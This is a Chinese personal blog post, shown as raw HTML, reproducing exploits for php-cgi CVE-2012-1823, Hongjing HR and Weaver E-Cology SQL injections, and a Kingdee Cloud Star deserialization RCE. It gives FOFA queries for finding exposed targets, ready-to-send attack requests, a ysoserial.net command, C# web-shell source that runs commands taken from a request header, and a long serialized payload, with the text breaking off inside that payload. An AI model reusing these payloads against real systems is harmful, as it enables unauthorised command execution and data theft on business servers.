<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>漏洞复现 | wangzhiii的博客</title><meta name="author" content="wangzhiii"><meta name="copyright" content="wangzhiii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一些漏洞">
<meta property="og:type" content="article">
<meta property="og:title" content="漏洞复现">
<meta property="og:url" content="http://wangzhi0013.github.io/2023/06/13/%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="wangzhiii的博客">
<meta property="og:description" content="一些漏洞">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://wangzhi0013.github.io/img/8.jpg">
<meta property="article:published_time" content="2023-06-13T02:45:58.653Z">
<meta property="article:modified_time" content="2023-07-19T02:01:20.617Z">
<meta property="article:author" content="wangzhiii">
<meta property="article:tag" content="网络安全">
<meta property="article:tag" content="漏洞">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://wangzhi0013.github.io/img/8.jpg"><link rel="shortcut icon" href="/./img/favicon.ico"><link rel="canonical" href="http://wangzhi0013.github.io/2023/06/13/%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?c44cd7fc8da8c10c754cb732b14e77f3";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '漏洞复现',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-07-19 10:01:20'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/./img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/./img/8.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="wangzhiii的博客"><span class="site-name">wangzhiii的博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">漏洞复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-13T02:45:58.653Z" title="发表于 2023-06-13 10:45:58">2023-06-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-19T02:01:20.617Z" title="更新于 2023-07-19 10:01:20">2023-07-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>26分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="漏洞复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><h4 id="php-cgi的远程代码执行漏洞-CVE-2012-1823"><a href="#php-cgi的远程代码执行漏洞-CVE-2012-1823" class="headerlink" title="php-cgi的远程代码执行漏洞(CVE-2012-1823)"></a>php-cgi的远程代码执行漏洞(CVE-2012-1823)</h4><p>影响版本</p>
<p>5.3.12&lt;php&lt;5.4.2</p>
<p>流量包</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1687000658571.png" alt="1687000658571"></p>
<p>url部分为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</span><br><span class="line"><span class="comment">#解码</span></span><br><span class="line"><span class="comment"># +号是空格 %3d是=  %3a是：</span></span><br><span class="line">/?-d allow_url_include=on -d auto_prepend_file=php://input</span><br></pre></td></tr></table></figure>

<p>通过该漏洞来修改WEB服务器的相关配置（本次攻击是为了开启allow_url_include、auto_prepend_file配置），从而使得一些远程执行代码的功能得以实现。</p>
<p>简单来说，这个特殊请求的功能就是使后面的POST数据能以PHP文件格式执行</p>
<h3 id="OA系统"><a href="#OA系统" class="headerlink" title="OA系统"></a>OA系统</h3><h4 id="宏景HR系统-CNVD-2023-08743"><a href="#宏景HR系统-CNVD-2023-08743" class="headerlink" title="宏景HR系统 CNVD-2023-08743"></a>宏景HR系统 CNVD-2023-08743</h4><h5 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">body = &#x27;&lt;div class=&quot;hj-hy-all-one-logo&quot;&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/servlet/codesettree?categories=（Hrms编码之后的sql语句）&amp;codesetid=1&amp;flag=c&amp;parentid=-1&amp;status=1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>hrms加解密工具 <a target="_blank" rel="noopener" href="https://github.com/vaycore/HrmsTool">https://github.com/vaycore/HrmsTool</a></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613105103117.png" alt="image-20230613105103117"></p>
<p>java -jar hrmsTool.jar -e  “1’ union all select ‘hongjing’,@@version–”</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">GET /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&amp;codesetid=1&amp;flag=c&amp;parentid=-1&amp;status=1 HTTP/1.1</span><br><span class="line">Host: xxxxxx</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<h4 id="泛微E-Cology"><a href="#泛微E-Cology" class="headerlink" title="泛微E-Cology"></a>泛微E-Cology</h4><h5 id="FileDownloadForOutDoc-SQL注入"><a href="#FileDownloadForOutDoc-SQL注入" class="headerlink" title="FileDownloadForOutDoc  SQL注入"></a>FileDownloadForOutDoc  SQL注入</h5><h6 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ecology 9.x 补丁版本 &lt; 10.58.0</span><br><span class="line">Ecology 8.x 补丁版本 &lt; 10.58.0</span><br></pre></td></tr></table></figure>

<p>fofa语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;泛微-协同办公OA&quot;</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1</span><br><span class="line">Host: xxxxxx</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close        </span><br><span class="line"></span><br><span class="line">fileid=2+WAITFOR DELAY+&#x27;0:0:5&#x27;&amp;isFromOutImg=1</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/UltimateSec/ultimaste-nuclei-templates/blob/main/ecology-oa/ecology-oa-filedownloadforoutdoc-sqli.yaml">https://github.com/UltimateSec/ultimaste-nuclei-templates/blob/main/ecology-oa/ecology-oa-filedownloadforoutdoc-sqli.yaml</a></p>
<h4 id="金蝶云星空RCE漏洞"><a href="#金蝶云星空RCE漏洞" class="headerlink" title="金蝶云星空RCE漏洞"></a>金蝶云星空RCE漏洞</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41904294/article/details/131332436?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_41904294/article/details/131332436?spm=1001.2014.3001.5502</a></p>
</blockquote>
<h5 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>由于金蝶云星空数据通信默认采用的是二进制数据格式，需要进行序列化与反序列化，在此过程中未对数据进行签名或校验，导致客户端发出的数据可被攻击者恶意篡改，写入包含恶意代码的序列化数据，达到在服务端远程命令执行的效果。该漏洞不仅存在于金蝶云星空管理中心（默认8000端口），普通应用（默认80端口）也存在类似问题。</p>
<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>6.x版本：低于6.2.1012.4</p>
<p>7.x版本：7.0.352.16 至 7.7.0.202111</p>
<p>8.x版本：8.0.0.202205 至 8.1.0.20221110</p>
<h5 id="fofa语法-1"><a href="#fofa语法-1" class="headerlink" title="fofa语法"></a>fofa语法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;金蝶云星空-管理中心&quot;</span><br></pre></td></tr></table></figure>

<h5 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h5><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">POST</span> <span class="string">/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">your-ip</span></span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">text/json</span></span><br><span class="line"> </span><br><span class="line">&#123;<span class="string">&quot;ap0&quot;</span><span class="string">:&quot;asdas&quot;</span>,<span class="string">&quot;format&quot;</span><span class="string">:&quot;3&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230624233109994.png" alt="image-20230624233109994"></p>
<p>使用 ysoserial.net工具构造Payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c &quot;a.cs;System.Windows.Forms.dll;System.Web.dll;System.dll&quot;</span><br></pre></td></tr></table></figure>

<p>命令中 -f 指定的是.net程序中的序列化类，-g  是ysoserial.net工具中的攻击链， 这里指定的是ActivitySurrogateSelectorFromFile链，这个攻击链可加载自定义的程序集。-c 是构造的程序集（a.cs），后面的dll文件是.NET  Framework中的一个核心DLL文件，包含了一些相关的类和方法(自行加载，不需要构造)</p>
<p>编写一个从请求头中获取参数执行命令的ASP.NET 程序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">E</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">E</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.Web.<span class="type">HttpContext</span> <span class="variable">context</span> <span class="operator">=</span> System.Web.HttpContext.Current;</span><br><span class="line">        context.Server.ClearError();</span><br><span class="line">        context.Response.Clear();</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.<span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">System</span>.Diagnostics.Process();</span><br><span class="line">            process.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            <span class="type">string</span> <span class="variable">cmd</span> <span class="operator">=</span> context.Request.Headers[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">            process.StartInfo.Arguments = <span class="string">&quot;/c &quot;</span> + cmd;</span><br><span class="line">            process.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">            process.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">            process.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">            process.Start();</span><br><span class="line">            <span class="type">string</span> <span class="variable">output</span> <span class="operator">=</span> process.StandardOutput.ReadToEnd();</span><br><span class="line">            context.Response.Write(output);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (System.Exception) &#123;&#125;</span><br><span class="line">        context.Response.Flush();</span><br><span class="line">        context.Response.End();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PS：通过接收 HTTP请求中的 cmd 参数，将其作为命令行参数传递给 cmd.exe 进程，并获取其输出结果，最终将输出结果作为 HTTP 响应返回给客户端（需放到ysoserial.net工具目录下或指定绝对路径）</p>
<p>生成序列化数据，加载到PoC中</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230624233741312.png" alt="image-20230624233741312"></p>
<p>最终exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Type: text/json</span><br><span class="line">cmd: dir</span><br><span class="line"> </span><br><span class="line">&#123;&quot;ap0&quot;:&quot;AAEAAAD/AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMctAAACAAEAAAD/AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkCAAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAAAAA0GBwMAAAABAQAAAAEAAAAHAgkNAAAADA4AAABhU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUEAAAAalN5c3RlbS5Xb3JrZmxvdy5Db21wb25lbnRNb2RlbC5TZXJpYWxpemF0aW9uLkFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3IrT2JqZWN0U3Vycm9nYXRlK09iamVjdFNlcmlhbGl6ZWRSZWYCAAAABHR5cGULbWVtYmVyRGF0YXMDBR9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyDgAAAAkPAAAACRAAAAABBQAAAAQAAAAJEQAAAAkSAAAAAQYAAAAEAAAACRMAAAAJFAAAAAEHAAAABAAAAAkVAAAACRYAAAABCAAAAAQAAAAJFwAAAAkYAAAAAQkAAAAEAAAACRkAAAAJGgAAAAEKAAAABAAAAAkbAAAACRwAAAABCwAAAAQAAAAJHQAAAAkeAAAABAwAAAAcU3lzdGVtLkNvbGxlY3Rpb25zLkhhc2h0YWJsZQcAAAAKTG9hZEZhY3RvcgdWZXJzaW9uCENvbXBhcmVyEEhhc2hDb2RlUHJvdmlkZXIISGFzaFNpemUES2V5cwZWYWx1ZXMAAAMDAAUFCwgcU3lzdGVtLkNvbGxlY3Rpb25zLklDb21wYXJlciRTeXN0ZW0uQ29sbGVjdGlvbnMuSUhhc2hDb2RlUHJvdmlkZXII7FE4PwIAAAAKCgMAAAAJHwAAAAkgAAAADw0AAAAAEAAAAk1akAADAAAABAAAAP//AAC4AAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBAwCY4pJkAAAAAAAAAADgAAIhCwELAAAIAAAABgAAAAAAAN4mAAAAIAAAAEAAAAAAABAAIAAAAAIAAAQAAAAAAAAABAAAAAAAAAAAgAAAAAIAAAAAAAADAECFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAAAAAAAACQJgAASwAAAABAAACoAgAAAAAAAAAAAAAAAAAAAAAAAABgAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAgAAAAAAAAAAAAAAAggAABIAAAAAAAAAAAAAAAudGV4dAAAAOQGAAAAIAAAAAgAAAACAAAAAAAAAAAAAAAAAAAgAABgLnJzcmMAAACoAgAAAEAAAAAEAAAACgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAABgAAAAAgAAAA4AAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAwCYAAAAAAABIAAAAAgAFADAhAABgBQAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbMAMAwwAAAAEAABECKAMAAAooBAAACgoGbwUAAApvBgAACgZvBwAACm8IAAAKcwkAAAoLB28KAAAKcgEAAHBvCwAACgZvDAAACm8NAAAKchEAAHBvDgAACgwHbwoAAApyGQAAcAgoDwAACm8QAAAKB28KAAAKF28RAAAKB28KAAAKF28SAAAKB28KAAAKFm8TAAAKB28UAAAKJgdvFQAACm8WAAAKDQZvBwAACglvFwAACt4DJt4ABm8HAAAKbxgAAAoGbwcAAApvGQAACioAARAAAAAAIgCHqQADDgAAAUJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAALwBAAAjfgAAKAIAAHQCAAAjU3RyaW5ncwAAAACcBAAAJAAAACNVUwDABAAAEAAAACNHVUlEAAAA0AQAAJAAAAAjQmxvYgAAAAAAAAACAAABRxQCAAkAAAAA+iUzABYAAAEAAAAOAAAAAgAAAAEAAAAZAAAAAgAAAAEAAAABAAAAAwAAAAAACgABAAAAAAAGACkAIgAGAFYANgAGAHYANgAKAKgAnQAKAMAAnQAKAOgAnQAOABsBCAEOACMBCAEKAE8BnQAOAIYBZwEGAK8BIgAGACQCGgIGAEQCGgIGAGkCIgAAAAAAAQAAAAAAAQABAAAAEAAXAAAABQABAAEAUCAAAAAAhhgwAAoAAQARADAADgAZADAACgAJADAACgAhALQAHAAhANIAIQApAN0ACgAhAPUAJgAxAAIBCgA5ADAACgA5ADQBKwBBAEIBMAAhAFsBNQBJAJoBOgBRAKYBPwBZALYBRABBAL0BMABBAMsBSgBBAOYBSgBBAAACSgA5ABQCTwA5ADECUwBpAE8CWAAxAFkCMAAxAF8CCgAxAGUCCgAuAAsAZQAuABMAbgBcAASAAAAAAAAAAAAAAAAAAAAAAJQAAAAEAAAAAAAAAAAAAAABABkAAAAAAAQAAAAAAAAAAAAAABMAnQAAAAAABAAAAAAAAAAAAAAAAQAiAAAAAAAAAAA8TW9kdWxlPgB1M3BqYWkwcS5kbGwARQBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AC5jdG9yAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQB1M3BqYWkwcQBTeXN0ZW0uV2ViAEh0dHBDb250ZXh0AGdldF9DdXJyZW50AEh0dHBTZXJ2ZXJVdGlsaXR5AGdldF9TZXJ2ZXIAQ2xlYXJFcnJvcgBIdHRwUmVzcG9uc2UAZ2V0X1Jlc3BvbnNlAENsZWFyAFN5c3RlbS5EaWFnbm9zdGljcwBQcm9jZXNzAFByb2Nlc3NTdGFydEluZm8AZ2V0X1N0YXJ0SW5mbwBzZXRfRmlsZU5hbWUASHR0cFJlcXVlc3QAZ2V0X1JlcXVlc3QAU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkAE5hbWVWYWx1ZUNvbGxlY3Rpb24AZ2V0X0hlYWRlcnMAZ2V0X0l0ZW0AU3RyaW5nAENvbmNhdABzZXRfQXJndW1lbnRzAHNldF9SZWRpcmVjdFN0YW5kYXJkT3V0cHV0AHNldF9SZWRpcmVjdFN0YW5kYXJkRXJyb3IAc2V0X1VzZVNoZWxsRXhlY3V0ZQBTdGFydABTeXN0ZW0uSU8AU3RyZWFtUmVhZGVyAGdldF9TdGFuZGFyZE91dHB1dABUZXh0UmVhZGVyAFJlYWRUb0VuZABXcml0ZQBGbHVzaABFbmQ